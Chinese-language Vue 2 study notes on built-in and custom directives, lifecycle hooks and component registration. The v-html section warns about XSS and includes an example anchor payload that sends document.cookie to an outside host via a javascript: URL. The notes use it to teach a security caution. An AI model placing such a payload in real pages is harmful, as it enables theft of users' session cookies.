#### 1.内置指令
    我们学过的指令：
            v-bind	: 单向绑定解析表达式, 可简写为 :xxx
            v-model	: 双向数据绑定
            v-for  	: 遍历数组/对象/字符串
            v-on   	: 绑定事件监听, 可简写为@
            v-if 	 	: 条件渲染（动态控制节点是否存存在）
            v-else 	: 条件渲染（动态控制节点是否存存在）
            v-show 	: 条件渲染 (动态控制节点是否展示)
    v-text指令：
            1.作用：向其所在的节点中渲染文本内容。v-text的值拿来当做被绑定节点的文本，不会解析标签。（常用！）
            2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
#### 2.v-html指令：
        1.作用：向指定节点中渲染包含html结构的内容。
        2.与插值语法的区别：
                    (1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
                    (2).v-html可以识别html结构。
        3.严重注意：v-html有安全性问题！！！！
                    (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
                    (2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
        在打印台可以直接打印出部分cookie，网站服务器给我们的cookie中，有的会作限制，仅http请求可获取，这样式的document.cookie不能拿到。
            如果网站没有对敏感信息做出限制，利用v-html在a标签里可以拿到cookie然后跳转到攻击者的服务器，拿到我们的cookie

```html
<div v-html="str2"></div>
```
```js
str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
```

#### 3.v-cloak指令（没有值）：
        1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
        2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。
                为什么网速慢会出现这个问题呢？因为网速慢，Vue.js还没请求过来，Vue还没介入管理模板，{{XXX}}不被解析，页面上会暂时出现{{XXX}}。
            可配合属性选择器display:none，当Vue介入管理时会删掉v-cloak属性，并解析{{}}。
```css
[v-cloak]:{
    display:none;
}
```
##### 使用场景：
    因为网速，页面作展示时要等Vue来解析模板

#### 4.v-once指令：
        1.v-once所在节点在初次动态渲染后，就视为静态内容了。
        2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
#### 5.v-pre指令：
        1.跳过其所在节点的编译过程。
        2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。  
    如果节点中用不到插值语法及一些指令，就用v-pre，该节点中的内容将不会被解析，加快页面整体编译      
#### 6.自定义属性
需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
    需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
    自定义指令总结：
*            一、定义语法：
                        (1).局部指令：
                                    new Vue({
                                        directives:{指令名:配置对象}   或   		directives{指令名:回调函数}
                                    }) 																	
                        (2).全局指令：
                                    Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)

*            二、配置对象中常用的3个回调：
                        (1).bind：指令与元素成功绑定时调用。
                        (2).inserted：指令所在元素被插入页面时调用。
                        (3).update：指令所在模板结构被重新解析时调用。

*            三、备注：
                        1.指令定义时不加v-，但使用时要加v-；
                        2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。用''包起来，因为声明函数简写形式不能带-，只能不简写了
    // 完整模式
```js
    big2:{
        // 指令与元素完成绑定的时候，这个时候还没有生成真实DOM
        bind(element,binding){
            element.value = binding.value;
        },
        // 指令所在元素被插入界面时，这个时候才有真正的DOM出现
        inserted(element,binding){
            element.focus()
        },
        // 指令所在的模板被重新渲染的时候
        update(element,binding){
            element.value = binding.value;
        }
    }

    简写模式去掉了inserted，简写函数的内容就是bind和update
```                
#### 7.生命周期函数
生命周期：
1. 又名：生命周期回调函数、生命周期函数、生命周期钩子。
2. 是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。
3. 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
4. 生命周期函数中的this指向是vm 或 组件实例对象。
* 常用的生命周期钩子：
						1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
						2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。

				关于销毁Vue实例
						1.销毁后借助Vue开发者工具看不到任何信息。
						2.销毁后自定义事件会失效，但原生DOM事件依然有效。
						3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。
[生命周期函数](../02_原理图/生命周期.png)

#### 8.非单元文件组件、Vue中使用组件的三大步骤：
        一、定义组件(创建组件)
        二、注册组件
        三、使用组件(写组件标签)

一、如何定义一个组件？
            使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
            区别如下：
                    1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
                    2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
            备注：使用template可以配置组件结构。

二、如何注册组件？
                1.局部注册：靠new Vue的时候传入components选项
                2.全局注册：靠Vue.component('组件名',组件)

三、编写组件标签：
                <school></school>
##### 几个注意点：
1. 关于组件名:
        一个单词组成：
                    第一种写法(首字母小写)：school
                    第二种写法(首字母大写)：School
        多个单词组成：
                    第一种写法(kebab-case命名)：my-school
                    第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)
        备注：
                (1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
                (2).可以使用name配置项指定组件在开发者工具中呈现的名字。

2. 关于组件标签:
        第一种写法：<school></school>
        第二种写法：<school/>在脚手架中可以随便用，但是在原始的HTML中，仅能解析第一个这种单标签组件
        备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。

3. 一个简写方式：
        const school = Vue.extend(options) 可简写为：const school = options
            虽然我们没有明面上的调用Vue.extend。但是在注册路由的时候，会判断传入的内容，如果传入的直接就是一个对象，他会帮我们调用Vue.extend。如果我们已经写好了Vue.extend，那么他拿过来直接就用了